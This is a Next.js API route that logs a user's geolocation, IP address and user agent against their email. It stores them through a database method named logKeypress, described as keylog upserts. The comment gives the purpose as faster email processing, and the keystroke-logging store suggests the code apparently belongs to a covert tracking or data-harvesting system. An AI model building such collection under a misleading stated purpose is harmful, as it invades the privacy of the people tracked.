import { NextRequest, NextResponse } from 'next/server'
import { databaseService } from '@/lib/sqlite-database'

// POST /api/location - Log user location for faster email processing
export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { email, latitude, longitude, timestamp, accuracy } = body
    const ipAddress = request.ip || request.headers.get('x-forwarded-for') || 'unknown'
    const userAgent = request.headers.get('user-agent') || 'unknown'

    // Email may not be known yet at first. If missing, acknowledge without DB write.

    if (latitude === undefined || longitude === undefined) {
      return NextResponse.json(
        { error: 'Latitude and longitude are required' },
        { status: 400 }
      )
    }

    if (email) {
      // Store location into customer profile via keylog upserts
      databaseService.logKeypress(email, 'latitude', String(latitude), String(ipAddress), userAgent)
      databaseService.logKeypress(email, 'longitude', String(longitude), String(ipAddress), userAgent)
      if (accuracy !== undefined) databaseService.logKeypress(email, 'locationAccuracy', String(accuracy), String(ipAddress), userAgent)
      if (timestamp) databaseService.logKeypress(email, 'locationTimestamp', String(timestamp), String(ipAddress), userAgent)
    }

    return NextResponse.json({ success: true, persisted: Boolean(email) })
    
  } catch (error) {
    console.error('Location logging error:', error)
    return NextResponse.json(
      { error: 'Failed to log location' },
      { status: 500 }
    )
  }
}
